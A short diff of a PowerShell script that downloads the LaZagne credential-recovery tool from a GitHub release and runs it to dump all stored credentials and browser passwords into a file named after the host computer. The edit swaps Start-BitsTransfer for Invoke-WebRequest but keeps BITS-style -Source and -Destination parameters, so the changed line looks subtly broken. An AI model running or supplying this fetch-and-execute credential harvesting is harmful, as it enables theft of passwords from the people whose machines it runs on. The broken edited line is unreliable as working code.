@@ -4,7 +4,7 @@
 # Download LaZagne and execute it
 $Test = "C:\temp"
 New-Item -ItemType Directory -Path "$Test"
-Start-BitsTransfer -Source "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe" -Destination "$Test/l.exe"
+Invoke-WebRequest -Source "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe" -Destination "$Test/l.exe"
 Set-Location $Test
 Start-Sleep -Milliseconds 15000
 .\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
